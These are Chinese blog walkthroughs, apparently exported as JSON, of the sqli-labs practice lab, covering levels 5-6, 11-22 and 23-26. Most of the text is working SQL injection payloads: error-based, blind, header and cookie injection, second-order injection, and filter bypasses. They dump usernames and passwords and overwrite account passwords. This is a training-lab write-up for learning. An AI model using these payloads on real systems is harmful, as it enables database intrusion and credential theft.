爆表：\n第一个表信息：\nURL：既然已经得到数据库，那么我们下一步就是表了；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  第二个表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 1,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  第四个表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  3.1.2 爆字段名\n从3.1.1中爆出了数据库：mysql、security等以及表：emails、users等\n表users中第一个字段名：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  第二个字段名：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 1,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  第三个字段名：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select column_name from information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 2,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  3.1.3 爆出字段信息\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select username,password from security.users limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  备注：floor(rand(0)*2) 只能爆出一列，所以我们只能填入一列，username或password\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,count(*),concat(0x3a,(select username from security.users limit 0,1),0x3a,floor(rand(0)*2))a from information_schema.columns group by a --+  后面只是改改数据即可\n3.2 利用double数值类型超出范围进行报错注入(此方法有局限性，目前已知==5.5.29、5.5.42==可用)\nEXP(x) 返回值e（自然对数的底）的x次方；如果不懂的，可以看这篇文章：《Mysql注入之exp报错注入》\nURL：备注：使用EXP函数进行报错时，必须的列长，如：这里是id、username、password三列\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+  如果列数量不对时会报错；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT USER())a))),3--+  3.2.1 爆数据库\n第一个数据库：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 0,1)a))),2,3--+  第二个数据库：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 1,1)a))),2,3--+  第三个数据库：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 2,1)a))),2,3--+  第四个数据库：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 3,1)a))),2,3--+  第五个数据库：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT schema_name from information_schema.schemata limit 4,1)a))),2,3--+  3.2.2 爆表名\n第一张表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from information_schema.tables where table_schema='security' limit 0,1)a))),2,3--+  第二张表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from information_schema.tables where table_schema='security' limit 1,1)a))),2,3--+  第三张表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from information_schema.tables where table_schema='security' limit 2,1)a))),2,3--+  第四张表：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT table_name from information_schema.tables where table_schema='security' limit 3,1)a))),2,3--+  3.2.3 爆字段名\n第一个字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from information_schema.columns where table_name='users' limit 0,1)a))),2,3--+  第二个字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from information_schema.columns where table_name='users' limit 1,1)a))),2,3--+  第三个字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT column_name from information_schema.columns where table_name='users' limit 2,1)a))),2,3--+  3.2.3 爆字段数据；\n第一条数据：username\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT username from security.users limit 0,1 )a))),2,3--+  第一条数据：password\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (exp(~(select * FROM(SELECT password from security.users limit 0,1 )a))),2,3--+  3.3 利用bigint溢出进行报错注入(此方法有局限性，目前已知==5.5.29、5.5.42==可用)\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select database())x) - ~0),2,3--+  3.3.1 爆出数据库\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select schema_name from information_schema.schemata limit 0,1)x) - ~0),2,3--+  http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select schema_name from information_schema.schemata limit 4,1)x) - ~0),2,3--+  3.3.2 爆表\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select table_name from information_schema.tables where table_schema='security' limit 0,1)x) - ~0),2,3--+  http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select table_name from information_schema.tables where table_schema='security' limit 3,1)x) - ~0),2,3--+  3.3.3 爆字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select column_name from information_schema.columns where table_name='users' limit 0,1)x) - ~0),2,3--+  http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select column_name from information_schema.columns where table_name='users' limit 1,1)x) - ~0),2,3--+  http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select column_name from information_schema.columns where table_name='users' limit 2,1)x) - ~0),2,3--+  3.3.4 爆字段数据\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select username from security.users limit 2,1)x) - ~0),2,3--+  http://localhost/sqli-labs-master/Less-5/?id=1' union select (!(select * from (select password from security.users limit 2,1)x) - ~0),2,3 --+  3.4 xpath函数报错注入\nXpath注入之****extractvalue函数\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+  3.4.1 爆出数据库信息\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select database()),0x3a))--+  3.4.2 爆出表名\nURL：备注：第一张表\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x3a))--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 1,1),0x3a))--+  URL：获取users表；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x3a))--+  3.4.3 爆表users中的字段名\nURL：第一个字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name='users' and TABLE_SCHEMA='security' limit 0,1),0x3a))--+  URL：获取‘username’字段名\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x3a))--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select column_name from information_schema.columns where table_name='users' limit 2,1),0x3a))--+  3.4.4 爆数据内容\nURL：一个字段获取；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1,concat(0x3a,(select username from security.users limit 0,1),0x3a))--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and extractvalue(1, concat((SELECT distinct concat(0x3a,username,0x3a,password,0x3a) FROM users limit 0,1)))--+  3.4.5 Xpath注入之****updatexml函数；和extractvalue语句一致，只是更换了个函数而已；\n爆数据库版本、当前用户信息；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+  爆数据库信息：\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+  爆数据库中表信息\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 0,1),0x7e),1)--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit 3,1),0x7e),1)--+  爆表中字段名；\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 0,1),0x7e),1)--+  URL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name='users' limit 1,1),0x7e),1)--+  爆字段数据；\nURL：\n一列一列\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select username from security.users limit 1,1),0x7e),1)--+  用户名和密码同时爆出\nURL：\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and updatexml(1,concat(0x7e,(select distinct concat(0x3a,username,0x3a,password,0x3a) from security.users limit 1,1),0x7e),1)--+  3.5 利用数据的重复性；适用于版本较低的mysql数据库；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+  四、时间盲注\n**4.1 利用sleep()函数进行注入，**当错误的时候会有5秒的时间延时；\nhttp://localhost/sqli-labs-master/Less-5/?id=1' and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+  less-06 双注入_GET_双引号_字符型注入\n和Less5差别只在于单双引号\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less1-6/","tags":["Sqli-labs"],"title":"Sqli-labs-less 1-6"},{"content":"less-11 这关开始换了种方式 ==POST== ，前面的都是==GET==\n基础知识\nGET和POST的区别\n最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。\nGET和POST还有一个重大区别\n简单的说：\nGET产生一个TCP数据包；POST产生两个TCP数据包。\n长的说：\n对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；\n而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。\n也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。\n因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？\n  GET与POST都有自己的语义，不能随便混用。\n  据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。\n  并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。\n  这里转载自这位师傅： 链接\n 这里回到题目\n一个新的界面\n 先用 admin 登录一下   这里用 burp 抓包，抓点击 Submit 后的包   这里使用 hackerbar 在 Post data 中填入，如图   在 uname=admin 后面加 ' 后报错，说明存在==SQL注入==   用 # 注释掉，发现正常   用不同账号有不同回显，说明能够联合查询   当order by 2时页面返回正常，说明字段是2.  uname=admin' order by 2 #\u0026amp;passwd=admin\u0026amp;submit=Submit\n查回显\nuname=-admin' union select 1,2 #\u0026amp;passwd=admin\u0026amp;submit=Submit\npayload: uname=-admin' union select 2,group_concat(0x7e,username,password) from users #\u0026amp;passwd=admin\u0026amp;submit=Submit\n在用户名中输入单引号报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin' LIMIT 0,1' at line 1\n'admin'' and password='' LIMIT 0,1说明可以报错注入，且看出时字符型注入，参数包裹中有单引号。\n在用户名处输入admin '#成功登录，说明闭合方式只有单引号。\npayload:uname=-admin' and updatexml(1,concat(0x5e,(select group_concat(username,0x7e,password) from users),0x5e),1) #\u0026amp;passwd=admin\u0026amp;submit=Submit\n这里发现报错不全，这是因为 updatexml 有一个最大显示长度，这里可以使用\nsubstr 函数截取显示数据\npayload：uname=admin' and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) #\u0026amp;passwd=admin\u0026amp;submit=Submit\n这里发现向后推了一位，后面内容继续后推即可显示\nless-12 测试单引号不报错，测试双引号报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\u0026quot;admin\u0026quot;\u0026quot;) and password=(\u0026quot; \u0026quot;) LIMIT 0,1’ at line 1\n从\u0026quot;admin\u0026quot;\u0026quot;) and password=(\u0026quot;\u0026quot;) LIMIT 0,1可以看出字符型注入，闭合方式为\u0026quot;)\n其余步骤与11关操作类似\nless-13 当 uname 和 passwd 正确的时候只显示成功\n测试单引号发现报错，根据\n You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘‘admin’’) and password=(‘’) LIMIT 0,1’ at line 1\n从'admin'') and password=('') LIMIT 0,1看出字符型注入闭合方式为')\n所以此关采取盲注（布尔、时间、报错）\n这里就各举一个例子，后面同理\n报错盲注\npayload：uname=admin') and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) #\u0026amp;passwd=admin\u0026amp;submit=Submit\n布尔盲注\npayload：uname=admin')and left(database(),1)\u0026gt;'a'#\u0026amp;passwd=任意密码\u0026amp;submit=Submit\n时间盲注\npayload：uname=admin')and If(ascii(substr(database(),1,1))\u0026gt;1,1,sleep(6))#\u0026amp;passwd=任意密码\u0026amp;submit=Submit\nless-14 测试单引号没报错，双引号报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin\u0026quot; LIMIT 0,1' at line 1\n中由admin\u0026quot; LIMIT 0,1得出闭合方式为 \u0026quot;\n其余的同13关\nless-15 测试单引号、双引号、括号之类的都没有报错。但当输入admin'#，成功登录，说明闭合方式为单引号，并且取消了报错，所以这关不能使用报错注入，只能使用布尔和时间盲注\n步骤同上\nless-16 与15关相同关闭了报错提示，但可以根据页面的回显来判断。\n当测试到admin\u0026quot;) #时页面显示登陆成功，所以闭合方式为双引号括号\u0026quot;)，如果不知道用户名可以这样测试， 123\u0026quot;) or 1 #\n本关依旧是可以进行布尔盲注和时间盲注。\nless-17 此关是一个修改密码的情形\n为了方便我们查看，我们在源码中加入几行代码\n看一下源码\n$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];  我们可以看到用户名被特殊处理了。\nfunction check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = \u0026quot;'\u0026quot; . mysql_real_escape_string($value) . \u0026quot;'\u0026quot;; } else { $value = intval($value); } return $value; }  传入函数的值首先被截断取前15个字符。\n get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置  如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.0 起将始终返回 FALSE。magic_quotes_gpc开启时用于在预定义字符（单引号、双引号、斜杠、NULL）前加上反斜杠，\n5.4.0 始终返回 FALSE，因为这个魔术引号功能已经从 PHP 中移除了。\n addslashes() 函数返回在预定义字符(单引号、双引号、斜杠、NULL)之前添加反斜杠的字符串。  注释：默认地，PHP 对所有的 GET、POST 和 COOKIE 数据自动运行 addslashes()。所以您不应对已转义过的字符串使用 addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数 get_magic_quotes_gpc() 进行检测。\n stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。  提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。\n ctype_digit() — 做纯数字检测  ctype_digit：检测字符串中的字符是否都是数字，负数和小数会检测不通过\n注意这里是字符串，所以如果检验的是数字，也不会通过.\n mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\\x00 \\n \\r \\ ' \u0026quot; \\x1a  从check_input()看出被接收的用户名最终结果为，要么是数字，要么是特殊字符被转义后的字符串。\n所以这里不好下手，只能从密码下手。\n// connectivity @$sql=\u0026quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\u0026quot;; $result=mysql_query($sql); $row = mysql_fetch_array($result); //echo $row; if($row) {  可以看出，用户名必须是数据库有的用户\n这里先试一下，给 uname 加个单引号\n果然被转义了，和之前分析的源码一致\n然后再尝试 passwd 发现报错\n由 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'admin'' at line 1\n中 admin' 可知闭合方式为 '\n如果后边加上注释，语句就变成了这样UPDATE users SET password = 'admin' #' WHERE username='admin'。密码都改成admin了,因为#注释了后边的限制。\n在密码处测试了一下111' and 1=1 #,也就是语句为uname=admin\u0026amp;passwd=admin' and 1=1#结果密码都变成1了。为啥不变成111呢？实际这里执行了UPDATE users SET password = '111'or 1=1;password=后面优先运算or，所以返回的结果是真，也就是1，所以说**sql语句是优先运算and和or的**\n这里发现所有密码都被改了，你可能有点慌，想改回去其实很简单只需要重新安装一下就可以了，再简单点就点一下sqli-labs首页的set up就行了\n这样就改回来了\n因为该语句没有返回的查询结果，所以我们尝试进行盲注\n尝试uname=admin\u0026amp;passwd=111' and updatexml(1,concat(0x5e,(select group_concat(username,password) from users),0x5e),1)# 报错\nYou can't specify target table 'users' for update in FROM clause  原因：不能不能先select出同一表中的某些值，再update这个表(在同一语句中)，\n==仅在mysql数据库中==\n我们再加一层select，还要给里面那层给个别名。 uname=admin\u0026amp;passwd=111' and updatexml(1,concat(0x5e,(select group_concat(username,password) from (select * from users)shell),0x5e),1)\n利用substruname=admin\u0026amp;passwd=111' and updatexml(1,concat(0x5e,substr((select group_concat(username,0x7e,password) from (select * from users)hack),1,31),0x5e),1)#,说一说为啥不用left()，right(),因为查询的结果内容太多，导致中间的部分内容用left和right函数弄不出来。而substr()可以灵活的定位截取。\n测试111' and sleep(1) #,发现可以进行时间盲注.步骤和前面关卡一致\n在mysql，时间等于sleep的时间乘以被改变的数量(14个数据)\nless-18 尝试弱密码爆破，admin和admin登陆成功。并且成功后新增返回UA信息。\n这里看一下源码\n$uname = check_input($_POST['uname']); $passwd = check_input($_POST['passwd']);  用户名密码出都做了过滤，\n$uagent = $_SERVER['HTTP_USER_AGENT']; $IP = $_SERVER['REMOTE_ADDR'];  这里使用了使用了 REMOTE_ADDR方法获取ip,这个函数是不能伪造的，像HTTP_X_FORWARDED_FOR这个可以获取到伪造的ip,所以尝试进行对UA注入。\n详情链接\n这里为了方便我们理解，同样增加一些代码\n后面会使用到一些插件，当然也可以用burp\n首先是ModHeader,用于编写头部信息，在此关中可以用于编写UA\n在这里输入一个单引号，发现报错\n根据报错结果我们可以推断出，执行的sql语句可能大致为为： insert into 表名 values('UA','IP','用户名');\nUA处变为1',1,1) #就不报错了，更加验证了此处的sql语句。\n当然也可以这样闭合\n1' or '1'='1\n我们可以直接在UA处进行报错注入。\nUser-Agent: 1',1,updatexml(1,concat(0x7e,database(),0x7e),1)) #  成功爆出数据库名。\nUser-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)) #成功爆出表。\nUser-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='uagents'),0x7e),1)) #成功爆出列名。\n但当我们\nUser-Agent: 1',1,updatexml(1,concat(0x7e,(select group_concat(id,uagent,ip_address) from uagents),0x7e),1)) # 出现了错误You can't specify target table '表名' for update in FROM clause,因为在MYSQL里，不能先select一个表的记录，在按此条件进行更新和删除同一个表的记录，==这里很显然我们的UA是在更新的==，解决办法是，将select得到的结果，再通过中间表select一遍，这样就规避了错误，\n这个问题只出现于mysql，mssql和oracle不会出现此问题。\n所以payload改为\nUser-Agent: 1',1,updatexml(1,concat(0x7e,(select concat(id,uagent,ip_address) from (select * from uagents)hack limit 0,1),0x7e),1)) #,修改limit查询全部内容，\n这里没用group_concat 是因为会报错Row 17 was cut by GROUP_CONCAT(),原来GROUP_CONCAT有个最大长度的限制，超过最大长度就会被截断掉，1024这就是一般MySQL系统默认的最大长度\nless-19 先弱口令admin 和 admin 爆破\n发现这次回显的是 referer\nHTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。\n输入单引号报错\n从报错信息中也可发现可能执行的sql语句。（和上一关注入类似）\nReferer:1',updatexml(1,concat(0x7e,database(),0x7e),1))#成功爆出数据库\n后面步骤同上\nless-20 依旧先弱口令admin 和 admin 爆破\n这关怎么测试UA都不报错，看了一下本关名字，为Cookie注入，那么久应该从cookie下手了\nCookie详解\n这里又用到了一个插件Cookie Editor，当然用burp也是可以的\n注意，改完Value 后==一定要点保存==(左侧第二个图标)\n并且从爆出的错误来看'admin'' LIMIT 0,1闭合方式为单引号。\n解法跟前面的get方式注入一样。\npayload: Cookie: uname=-admin' union select 1,(select group_concat(username,0x7e,password) from users),3 #\nless-21 依旧先弱口令admin 和 admin 爆破\n然后看一下cookie中的值YOUR COOKIE : uname = YWRtaW4\n其中的这个YWRtaW4其实是admin被base64 编码后的结果\n这里推荐这个网站\n这关跟上关一样，也是cookie,只不过将cookie经过base64编码了，\n将admin'base64编码后进行测试Cookie: uname=YWRtaW4n\n报错：'admin'') LIMIT 0,1 ，可以看出闭合方式为单引号加括号，')\n其余步骤和上关一样。(cookie要经过base64编码)\nless-22 cookie处编4加上单引号没报错，注意此关也需要base64编码。\n加上双引号报错： \u0026quot;admin\u0026quot;\u0026quot; LIMIT 0,1,说明闭合方式为双引号\u0026quot;\n其余操作和20关类似。\n","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/sqli-labs-less11-22/","tags":["Sqli-labs"],"title":"Sqli-labs-less 11-22"},{"content":"less-23 首先还是单引号尝试\nhttp://localhost/sqli-labs-master/Less-23/?id=1'\n发现报错\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1\n并且由 '1'' LIMIT 0,1 可知是单引号闭合\n但当我们用--+或者%23注释时，还是报错\n这时有些疑惑，看了一下源码\n发现这里对 # (空格) --+ 做了过滤处理\n所以这里我们只能通过and 或者or 语句进行闭合\n然后这里还有一个新发现，就是一种特殊的注释符 ==;%00==\n那我们先用注释符的方法做一下这一关\nhttp://localhost/sqli-labs-master/Less-23/?id=1';%00\n成功惹~\n后面就和第一关一样了，简略写一下步骤吧\n 判断列数  http://localhost/sqli-labs-master/Less-23/?id=1' order by 3;%00\n这里说明有三列\n 找回显  http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,3 ;%00\n 爆库  http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata;%00\n 爆表  http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security';%00\n 爆列名  http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' ;%00\n 爆信息  http://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users ;%00\n也可以尝试将单引号闭合\nhttp://localhost/sqli-labs-master/Less-23/?id=1' and '1'='1\n但此时我们就不能用 order by 判断字段数了，但我们可以利用select一个一个试，当我们select 1,2,3的时候，页面不报错了，所以说有三个字段。\nhttp://localhost/sqli-labs-master/Less-23/?id=-1' union select 1,version(),3 and '1'='1,其余查询和前面的操作基本类似。 但此时回显位置只有2和3，而且由于3位置先和后面的and做运算，所以始终为1或者0，所以只能在2处注入。\n因为在select 1，2，3，4的时候会报错，所以可以使用报错注入\nhttp://localhost/sqli-labs-master/Less-23/?id=-1' and extractvalue(1,concat(0x7e,user())) and '1'='1\n后面只是换语句即可\nless-24 此题考察二次注入\n这关和之前又不一样，是个完整的登录注册页面\n我们看一眼代码\n//login.php中的源码 $username = mysql_real_escape_string($_POST[\u0026quot;login_user\u0026quot;]); $password = mysql_real_escape_string($_POST[\u0026quot;login_password\u0026quot;]); //mysql_real_escape_string() 函数,转义SQL语句中使用的字符串中的特殊字符。 //pass_change.php中的源码 $username= $_SESSION[\u0026quot;username\u0026quot;]; $curr_pass= mysql_real_escape_string($_POST['current_password']); $pass= mysql_real_escape_string($_POST['password']); $re_pass= mysql_real_escape_string($_POST['re_password']); if($pass==$re_pass) { $sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u0026quot;; //这段代码的意思就是如果用户输入的两次新密码相同，就可以更改密码，这里就有注入点了，如果用户的用户名中带有注释，那么后面的代码就不会执行，就不用判断老密码了，所以我们就可以在知道用户名，不知道密码的情况下修改密码，前提是后台代码不会对用户名进行检查  在login_create.php中\n$username= mysql_escape_string($_POST['username']) ; $pass= mysql_escape_string($_POST['password']); $re_pass= mysql_escape_string($_POST['re_password']); $sql = \u0026quot;insert into users ( username, password) values(\\\u0026quot;$username\\\u0026quot;, \\\u0026quot;$pass\\\u0026quot;)\u0026quot;;  这里，前面是获取用户名和密码，后面是将用户名和密码插入到数据库中 mysql_escape_string — 转义一个字符串用于 mysql_query\n例：aa'bb ----\u0026gt; aa\\'bb  当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反斜杠。\n$username= $_SESSION[\u0026quot;username\u0026quot;];  所以在这里并没有对用户名的合法性作出检验，所有会有一个注入点： 如果我们新建用户时，用户名里有注释符，那么我们在修改密码时，这个用户名就会将后面的内容注释，也就不需要旧密码\n我们从命令行看一下没注册前的数据\n 注册一个跟上图原有的username相似的username：   数据表中已存入刚注册的username和password：    寻找另一处引用这个数据并没有被转义又插入进了数据库中。即：在登录后的密码修改处\n  .\n Reset后admin的密码就会被更改：  原理\n这就是二次注入，它的原理是：\n（1）后端（PHP）代码对语句进行了转义 （2）保存进数据库（mysql）时没有转义，是原语句 123  简而言之就是数据库对自己存储的数据非常放心，而用户恰恰向数据库插入了恶意语句。\n解析\n比如前面所注册的admin '#账号，在注册时，后端对其进行了转义（ addslashes() 或者mysql_real_escape_string和mysql_escape_string 等），'#被转义成了其他的东西，所以一次注入无效。 但是在保存进数据库的时候，还是admin '#。\n那么修改密码时的语句如下：\nupdate users set password='123' where username='admin '#' 1  所以你以为修改的是admin '#的账号，但是数据库理解成要修改密码的账号是admin。\nless-25 看题目提示All Your'OR' and 'AND' belong to us\n猜测，and 和 or 被过滤掉了\n尝试到http://localhost/sqli-labs-master/Less-25/?id=1' order by 3 --+,报错了，猜测是or被过滤了。\n大小写绕过不成功·。尝试双写，可以绕过http://localhost/sqli-labs-master/Less-25/?id=1' oorrder by 3 --+\n当然order by 的order由于含有特殊单词or被过滤，我们构造oorrder by 其他单词也是一样进行常规注入就可以了。\n可用联合查询，和报错注入\nless-25a 这一关关闭了报错，同样过滤了and和or\n猜一下。http://localhost/sqli-labs-master/Less-25a/?id=1' --+没反应….可能为数字型注入。\nhttp://localhost/Less-25a/?id=1 oorrder by 3成功回显。\n其余步骤类似前面关卡。\n但，关闭了报错，所以不能用报错注入了\nless-26 测试单引号，报错，根据报错提示'1'' LIMIT 0,1，推出字符型注入，单引号闭合。\n用%23或者--+闭合以下，发现还是报错，猜测可能过滤了注释符，可用;%00成功绕过。也可用and '1'='1拼接后边的单引号。\nhttp://localhost/sqli-labs-master/Less-26/?id=1' 1--+2--+3 --+报错123' LIMIT 0,1验证了将注释过滤成了空。\n并且http://localhost/sqli-labs-master/Less-26/?id=1' 1and2or3 --+报错123' LIMIT 0,1推出and和or也被过滤，尝试双写，发现可以绕过\n看下源码，看下过滤了什么\nfunction blacklist($id) { $id= preg_replace('/or/i',\u0026quot;\u0026quot;, $id);\t//strip out OR (non case sensitive) $id= preg_replace('/and/i',\u0026quot;\u0026quot;, $id);\t//Strip out AND (non case sensitive) $id= preg_replace('/[\\/\\*]/',\u0026quot;\u0026quot;, $id);\t//strip out /* $id= preg_replace('/[--]/',\u0026quot;\u0026quot;, $id);\t//Strip out -- $id= preg_replace('/[#]/',\u0026quot;\u0026quot;, $id);\t//Strip out # $id= preg_replace('/[\\s]/',\u0026quot;\u0026quot;, $id);\t//Strip out spaces $id= preg_replace('/[\\/\\\\\\\\]/',\u0026quot;\u0026quot;, $id);\t//Strip out slashes return $id; }  查看源代码，发现空格被过滤了，/**/能代替空格但也被过滤了。\n考虑空格：用以下几种url编码代替空格即可\n %09 Tab键（水平） %0a 新建一行 %0c 新的一页 %0d return 键 %0b Tab键（垂直） %a0 空格 () 绕过  关于or 和 and 的绕过\n 可用双写，即oorr 和 aandnd 绕过 或者用||代替or 